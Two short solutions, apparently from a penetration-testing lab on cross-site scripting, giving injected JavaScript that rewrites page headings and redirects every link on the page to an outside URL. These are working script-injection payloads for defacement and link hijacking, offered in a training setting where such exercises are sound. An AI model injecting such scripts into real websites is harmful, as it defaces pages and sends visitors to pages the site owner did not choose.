* Solution 1: Modifying HTML

<script>

document.getElementsByTagName("h2")[2].innerHTML = "Modified You";
document.getElementsByTagName("h1")[0].innerHTML = "Found You";

</script>


* Solution 2: Changing Links

<script>

var links = document.getElementsByTagName("a");

for  (i=0; i < links.length; i++)
{
  links[i].href = "http://PentesterAcademy.com/topics";
  links[i].innerHTML = "Link Modified";
  
}

</script>
